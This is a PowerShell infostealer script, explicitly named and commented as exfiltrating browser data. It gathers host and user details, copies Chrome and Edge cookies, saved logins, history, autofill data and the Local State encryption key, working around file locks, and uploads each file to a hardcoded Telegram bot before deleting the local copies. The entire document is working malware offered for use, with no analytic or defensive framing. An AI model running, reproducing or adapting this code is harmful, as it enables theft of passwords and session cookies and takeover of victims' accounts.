# steal_telegram.ps1
# Exfiltrates all browser data to Telegram bot
# Uses your provided bot token and chat ID

$bot_token = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
$chat_id = "6760965981"
$telegram_url = "https://api.telegram.org/bot$bot_token/sendDocument"

$temp_dir = "$env:TEMP\steal_tg"
New-Item -ItemType Directory -Force -Path $temp_dir | Out-Null

# --- PC INFO ---
$pc_info = @{
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
}

# Send PC info as text message
$caption = "PC: $($pc_info.hostname) | User: $($pc_info.username) | OS: $($pc_info.os) | IP: $($pc_info.ip)"
$body = @{ chat_id = $chat_id; text = $caption }
Invoke-RestMethod -Uri "https://api.telegram.org/bot$bot_token/sendMessage" -Method Post -Body $body

# --- BROWSER PATHS ---
$browsers = @(
    @{
        Name = "Chrome"
        LocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
        Cookies = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
        History = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
        LoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        WebData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
    },
    @{
        Name = "Edge"
        LocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
        Cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
        History = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
        LoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
        WebData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
    }
)

# --- COPY LOCKED FILES ---
function Copy-LockedFile {
    param($src, $dst)
    try { Copy-Item $src $dst -Force -ErrorAction Stop; return $true } catch {}
    try {
        robocopy (Split-Path $src) (Split-Path $dst) (Split-Path $src -Leaf) /B /R:1 /W:1 /NFL /NDL /NJH /NJS | Out-Null
        return (Test-Path $dst)
    } catch {}
    return $false
}

# --- SEND EACH FILE INDIVIDUALLY ---
$files_sent = 0
foreach ($b in $browsers) {
    $file_types = @(
        @{ Path = $b.LocalState; Name = "$($b.Name)_LocalState.json" },
        @{ Path = $b.Cookies; Name = "$($b.Name)_Cookies.db" },
        @{ Path = $b.History; Name = "$($b.Name)_History.db" },
        @{ Path = $b.LoginData; Name = "$($b.Name)_LoginData.db" },
        @{ Path = $b.WebData; Name = "$($b.Name)_WebData.db" }
    )
    
    foreach ($ft in $file_types) {
        if (Test-Path $ft.Path) {
            $dst = "$temp_dir\$($ft.Name)"
            if (Copy-LockedFile $ft.Path $dst) {
                $file_size = (Get-Item $dst).Length
                if ($file_size -gt 50 * 1024 * 1024) {
                    # File > 50MB – skip (rare)
                    continue
                }
                try {
                    $form = @{
                        chat_id = $chat_id
                        document = Get-Item -Path $dst
                        caption = "$($ft.Name) | $([math]::Round($file_size/1KB)) KB"
                    }
                    Invoke-RestMethod -Uri $telegram_url -Method Post -Form $form -ErrorAction Stop
                    $files_sent++
                } catch {
                    "$(Get-Date) - Failed to send $($ft.Name): $_" | Out-File "$temp_dir\errors.log" -Append
                }
                Remove-Item $dst -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

# --- FINAL STATUS ---
$status = "Sent $files_sent file(s). Errors logged to $temp_dir\errors.log"
$body = @{ chat_id = $chat_id; text = $status }
Invoke-RestMethod -Uri "https://api.telegram.org/bot$bot_token/sendMessage" -Method Post -Body $body
